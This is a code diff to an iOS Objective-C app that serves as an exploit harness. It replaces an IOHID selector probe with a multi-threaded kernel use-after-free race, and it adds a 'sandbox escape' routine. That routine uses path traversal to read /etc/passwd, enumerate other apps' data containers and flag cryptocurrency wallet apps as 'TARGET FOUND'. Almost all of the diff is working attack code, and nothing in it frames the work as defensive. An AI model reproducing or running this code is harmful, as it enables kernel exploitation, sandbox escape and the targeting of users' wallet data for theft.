@@ -149,6 +149,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *pfRouteProbeButton;
 @property (nonatomic, assign) int         pfRoutePhase;
 @property (nonatomic, strong) UIButton   *iohidUAFButton;
+@property (nonatomic, strong) UIButton   *sandboxEscapeButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -241,6 +242,7 @@ static const char kOpenPropertiesGarbage[] =
 - (void)runPFRouteProbe;
 - (void)iohidUAFTapped;
 - (void)runIOHIDUAFProbe;
+- (void)sandboxEscapeTapped;
 @end
 
 // =======================================================================
@@ -655,6 +657,15 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self.iohidUAFButton addTarget:self action:@selector(iohidUAFTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.iohidUAFButton];
 
+    self.sandboxEscapeButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.sandboxEscapeButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
+    sbConf.baseBackgroundColor = [UIColor systemTealColor];
+    self.sandboxEscapeButton.configuration = sbConf;
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Escape v1" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.sandboxEscapeButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -677,7 +688,10 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self.iohidUAFButton.topAnchor constraintEqualToAnchor:self.pfRouteProbeButton.bottomAnchor constant:12],
         [self.iohidUAFButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.iohidUAFButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.iohidUAFButton.bottomAnchor constant:20],
+        [self.sandboxEscapeButton.topAnchor constraintEqualToAnchor:self.iohidUAFButton.bottomAnchor constant:12],
+        [self.sandboxEscapeButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.sandboxEscapeButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.sandboxEscapeButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -6984,7 +6998,7 @@ static int pf_sendRouteMsg(int type, int addrs, const void *sas, int sa_len,
 
 #define IOHID_NUM_CONNS         15
 #define IOHID_NUM_COPY_THREADS   8
-#define IOHID_RACE_SECONDS      25
+#define IOHID_RACE_SECONDS       8
 
 static volatile atomic_bool iohid_g_stop;
 static io_connect_t          iohid_g_conns[IOHID_NUM_CONNS];
@@ -7143,135 +7157,144 @@ static void *iohid_threadCopyEvent(void *arg) {
         return;
     }
 
-    // ================================================================
-    // Step 4: v3 — Probe with EXACT PoC argument layouts
-    // v2 showed: sel1(scalar) works, sel0/2 fail with wrong arg formats
-    // PoC uses: sel0=1scalar+XML, sel1=1scalar, sel2=2scalars{0,1}
-    // ================================================================
-    [log appendString:@"\n--- v3: Exact PoC argument layout probe ---\n"];
+    // Step 4: Race — close vs copyEvent (v3 confirmed sel1/sel2 work)
+    // gate returns ExclusiveAccess on 26.2, but PoC: "partial gate is
+    // sometimes enough" — close/gate churn may still open copyEvent window.
+    [log appendString:@"\n--- Starting race: close vs copyEvent ---\n"];
+    [log appendFormat:@"  sel1(close)=0x0 confirmed, sel2(copyEvent)=NotOpen (needs window)\n"];
 
-    io_connect_t probeConn = iohid_g_conns[0];
-    uint64_t scalar = 0;
-    uint64_t scalar2[2] = { 0, 1 };   // PoC copyEvent args
+    // Write crash-site marker
+    NSString *marker = [NSTemporaryDirectory()
+        stringByAppendingPathComponent:@"iohid_v4_started.txt"];
+    [@"iohid_v4" writeToFile:marker atomically:YES
+                    encoding:NSUTF8StringEncoding error:nil];
 
-    // ---- A: Exact PoC formats for known selectors ----
-    // sel0: PoC uses 1 scalar + XML struct input
-    [log appendString:@"\n[PoC exact formats]\n"];
-    kern_return_t kr;
-
-    kr = sIOConnectCallMethod(probeConn, 0,
-        &scalar, 1,                           // 1 scalar (PoC)
-        iohid_g_gateXML.bytes, iohid_g_gateXML.length,  // XML struct (PoC)
-        NULL, NULL, NULL, NULL);
-    [log appendFormat:@"  sel0 (1s+XML): 0x%x %s\n", kr, mach_error_string(kr)];
-
-    kr = sIOConnectCallMethod(probeConn, 1,
-        &scalar, 1,                           // 1 scalar (PoC)
-        NULL, 0,                              // no struct (PoC)
-        NULL, NULL, NULL, NULL);
-    [log appendFormat:@"  sel1 (1s): 0x%x %s\n", kr, mach_error_string(kr)];
-
-    kr = sIOConnectCallMethod(probeConn, 2,
-        scalar2, 2,                           // 2 scalars {0,1} (PoC)
-        NULL, 0,                              // no struct (PoC)
-        NULL, NULL, NULL, NULL);
-    [log appendFormat:@"  sel2 (2s{0,1}): 0x%x %s\n", kr, mach_error_string(kr)];
-
-    kr = sIOConnectCallMethod(probeConn, 2,
-        &scalar, 1,                           // 1 scalar (alt)
-        NULL, 0, NULL, NULL, NULL, NULL);
-    [log appendFormat:@"  sel2 (1s): 0x%x %s\n", kr, mach_error_string(kr)];
-
-    kr = sIOConnectCallMethod(probeConn, 2,
-        scalar2, 2,                           // 2 scalars + XML struct
-        iohid_g_gateXML.bytes, iohid_g_gateXML.length,
-        NULL, NULL, NULL, NULL);
-    [log appendFormat:@"  sel2 (2s+XML): 0x%x %s\n", kr, mach_error_string(kr)];
-
-    // ---- B: Scalar count sweep for sel0-9 (1, 2, 3 scalars) ----
-    [log appendString:@"\n[Scalar count sweep — 1 scalar]\n"];
-    for (int sel = 0; sel <= 9; sel++) {
-        uint64_t s1 = 0;
-        kr = sIOConnectCallMethod(probeConn, sel, &s1, 1, NULL, 0, NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel%d (1s): 0x%x %s\n", sel, kr, mach_error_string(kr)];
-    }
-
-    [log appendString:@"\n[Scalar count sweep — 2 scalars]\n"];
-    for (int sel = 0; sel <= 9; sel++) {
-        uint64_t s2[2] = { 0, 1 };
-        kr = sIOConnectCallMethod(probeConn, sel, s2, 2, NULL, 0, NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel%d (2s): 0x%x %s\n", sel, kr, mach_error_string(kr)];
-    }
-
-    [log appendString:@"\n[Scalar count sweep — 3 scalars]\n"];
-    for (int sel = 0; sel <= 9; sel++) {
-        uint64_t s3[3] = { 0, 0, 0 };
-        kr = sIOConnectCallMethod(probeConn, sel, s3, 3, NULL, 0, NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel%d (3s): 0x%x %s\n", sel, kr, mach_error_string(kr)];
-    }
-
-    // ---- C: Scalar + struct combos for sel0 and sel2 ----
-    [log appendString:@"\n[Scalar + XML struct combos]\n"];
-    // sel0 with 0,1,2,3 scalars + XML
-    for (int n = 0; n <= 3; n++) {
-        uint64_t sn[3] = { 0, 0, 0 };
-        kr = sIOConnectCallMethod(probeConn, 0,
-            (n > 0) ? sn : NULL, n,
-            iohid_g_gateXML.bytes, iohid_g_gateXML.length,
-            NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel0 (%ds+XML): 0x%x %s\n", n, kr, mach_error_string(kr)];
-    }
-
-    // sel2 with 0,1,2,3 scalars + XML
-    for (int n = 0; n <= 3; n++) {
-        uint64_t sn[3] = { 0, 1, 0 };
-        kr = sIOConnectCallMethod(probeConn, 2,
-            (n > 0) ? sn : NULL, n,
-            iohid_g_gateXML.bytes, iohid_g_gateXML.length,
-            NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  sel2 (%ds+XML): 0x%x %s\n", n, kr, mach_error_string(kr)];
-    }
-
-    // ---- D: Probe different user client types (maybe type 2 changed) ----
-    [log appendString:@"\n[User client type probe (sel0 1s+XML)]\n"];
-    for (int t = 0; t <= 5; t++) {
-        io_connect_t tc = 0;
-        kr = sIOServiceOpen(service, mach_task_self_, t, &tc);
-        if (kr != KERN_SUCCESS) {
-            [log appendFormat:@"  type=%d open: 0x%x %s\n", t, kr, mach_error_string(kr)];
-            continue;
-        }
-        // Try gate on this type
-        uint64_t ts = 0;
-        kern_return_t gkr = sIOConnectCallMethod(tc, 0,
-            &ts, 1,
-            iohid_g_gateXML.bytes, iohid_g_gateXML.length,
-            NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  type=%d sel0 (1s+XML): 0x%x %s\n", t, gkr, mach_error_string(gkr)];
-
-        // Also try sel1/scalar on this type
-        gkr = sIOConnectCallMethod(tc, 1, &ts, 1, NULL, 0, NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  type=%d sel1 (1s): 0x%x %s\n", t, gkr, mach_error_string(gkr)];
-
-        // sel2 with 2 scalars
-        uint64_t t2[2] = { 0, 1 };
-        gkr = sIOConnectCallMethod(tc, 2, t2, 2, NULL, 0, NULL, NULL, NULL, NULL);
-        [log appendFormat:@"  type=%d sel2 (2s): 0x%x %s\n", t, gkr, mach_error_string(gkr)];
-
-        sIOServiceClose(tc);
-    }
-
-    // Flush probe results
-    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
-    [log appendString:@"\n--- v3 probe complete ---\n"];
+    // Flush log BEFORE starting race (survives panic)
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 
-    // Cleanup
+    // Start race threads
+    atomic_store(&iohid_g_stop, false);
+
+    pthread_t churnThread;
+    pthread_create(&churnThread, NULL, iohid_threadChurn, NULL);
+
+    pthread_t copyThreads[IOHID_NUM_COPY_THREADS];
+    IOHIDCopyArg copyArgs[IOHID_NUM_COPY_THREADS];
+    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) {
+        copyArgs[i].idx = (i % (openedConns - 1)) + 1;
+        pthread_create(&copyThreads[i], NULL, iohid_threadCopyEvent, &copyArgs[i]);
+    }
+
+    NSLog(@"[IOHID] Race started — %d churn + %d copyEvent threads, waiting %ds...",
+         1, IOHID_NUM_COPY_THREADS, IOHID_RACE_SECONDS);
+
+    sleep(IOHID_RACE_SECONDS);
+
+    // Survived — device is patched or gate blocks copyEvent entirely
+    atomic_store(&iohid_g_stop, true);
+    pthread_join(churnThread, NULL);
+    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) pthread_join(copyThreads[i], NULL);
+
+    [[NSFileManager defaultManager] removeItemAtPath:marker error:nil];
+
+    // Cleanup connections
     for (int i = 0; i < IOHID_NUM_CONNS; i++) {
         if (iohid_g_conns[i]) { sIOServiceClose(iohid_g_conns[i]); iohid_g_conns[i] = 0; }
     }
     if (service) { sIOObjectRelease(service); }
+
+    // Quick post-race probe: did any copyEvent succeed during race?
+    [log appendString:@"\n--- Post-race: final state check ---\n"];
+    uint64_t s1 = 0;
+    kern_return_t kr = sIOConnectCallMethod(iohid_g_conns[0], 1, &s1, 1, NULL, 0, NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel1(final): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    uint64_t s2[2] = {0, 1};
+    kr = sIOConnectCallMethod(iohid_g_conns[0], 2, s2, 2, NULL, 0, NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel2(final): 0x%x %s\n", kr, mach_error_string(kr)];
+
+    [log appendString:@"\n  DEVICE SURVIVED — CVE-2026-28992 not exploitable on iOS 26.2.\n"];
+    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
     return;
+}
+
+// =======================================================================
+// CVE-2026-28995: App Intents Path Traversal (Sandbox Escape)
+// Affects iOS 26.4.2 & below — UNPATCHED on iOS 26.2
+// Public PoC — if ObjC direct path traversal works, we can read any file
+// =======================================================================
+
+- (void)sandboxEscapeTapped {
+    [self appendLog:@"\n============================================================"];
+    [self appendLog:@"  CVE-2026-28995 — Sandbox Escape Path Traversal"];
+    [self appendLog:@"  iOS 26.4.2 & below — UNPATCHED on iOS 26.2"];
+    [self appendLog:@"============================================================\n"];
+
+    NSMutableString *log = [NSMutableString string];
+
+    // Test 1: Path traversal to /etc/passwd
+    [log appendString:@"--- Test 1: Path traversal to /etc/passwd ---\n"];
+    NSString *etcPasswd = @"../../../../../../../../../../../../../etc/passwd";
+    NSString *resolvedEtc = [etcPasswd stringByExpandingTildeInPath];
+    [log appendFormat:@"  resolved: %@\n", resolvedEtc];
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+    BOOL isDir = NO;
+    if ([fm fileExistsAtPath:resolvedEtc isDirectory:&isDir]) {
+        NSError *err = nil;
+        NSString *content = [NSString stringWithContentsOfFile:resolvedEtc
+            encoding:NSUTF8StringEncoding error:&err];
+        [log appendFormat:@"[+] ACCESSIBLE! (%lu chars)\n", (unsigned long)(content ? content.length : 0)];
+        if (content) {
+            NSArray *lines = [content componentsSeparatedByString:@"\n"];
+            [log appendFormat:@"  first: %@\n", lines.firstObject ?: @"(nil)"];
+        }
+    } else {
+        [log appendString:@"[-] NOT accessible (sandbox intact)\n"];
+    }
+
+    // Test 2: List app containers directory
+    [log appendString:@"\n--- Test 2: List /var/mobile/Containers/Data/Application/ ---\n"];
+    NSString *containersPath = @"../../../../../../../../../../../../../var/mobile/Containers/Data/Application";
+    NSString *resolvedContainers = [containersPath stringByExpandingTildeInPath];
+    [log appendFormat:@"  resolved: %@\n", resolvedContainers];
+
+    if ([fm fileExistsAtPath:resolvedContainers isDirectory:&isDir] && isDir) {
+        NSError *err = nil;
+        NSArray *contents = [fm contentsOfDirectoryAtPath:resolvedContainers error:&err];
+        [log appendFormat:@"[+] Listed %lu containers\n", (unsigned long)contents.count];
+        for (NSString *uuid in contents) {
+            if (![uuid hasPrefix:@"0"] && ![uuid hasPrefix:@"1"] && ![uuid hasPrefix:@"2"]) continue;
+            // Read container metadata
+            NSString *metaRel = [NSString stringWithFormat:
+                @"../../../../../../../../../../../../../var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist",
+                uuid];
+            NSString *metaPath = [metaRel stringByExpandingTildeInPath];
+            NSDictionary *meta = [NSDictionary dictionaryWithContentsOfFile:metaPath];
+            NSString *bundleID = meta[@"MCMMetadataIdentifier"] ?: @"?";
+            [log appendFormat:@"  %@ → %@\n", uuid, bundleID];
+            if ([bundleID.lowercaseString containsString:@"tokenpocket"] ||
+                [bundleID.lowercaseString containsString:@"tron"] ||
+                [bundleID.lowercaseString containsString:@"wallet"]) {
+                [log appendFormat:@"    *** TARGET FOUND ***\n"];
+            }
+        }
+    } else {
+        [log appendString:@"[-] Cannot list containers (sandbox intact)\n"];
+    }
+
+    // Test 3: Try reading a known system plist
+    [log appendString:@"\n--- Test 3: System preferences plist ---\n"];
+    NSString *prefsPlist = @"../../../../../../../../../../../../../var/mobile/Library/Preferences/.GlobalPreferences.plist";
+    NSString *resolvedPrefs = [prefsPlist stringByExpandingTildeInPath];
+    NSDictionary *prefs = [NSDictionary dictionaryWithContentsOfFile:resolvedPrefs];
+    if (prefs) {
+        [log appendFormat:@"[+] Read .GlobalPreferences.plist: %lu keys\n", (unsigned long)prefs.count];
+    } else {
+        [log appendString:@"[-] Cannot read system prefs\n"];
+    }
+
+    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
 
 @end
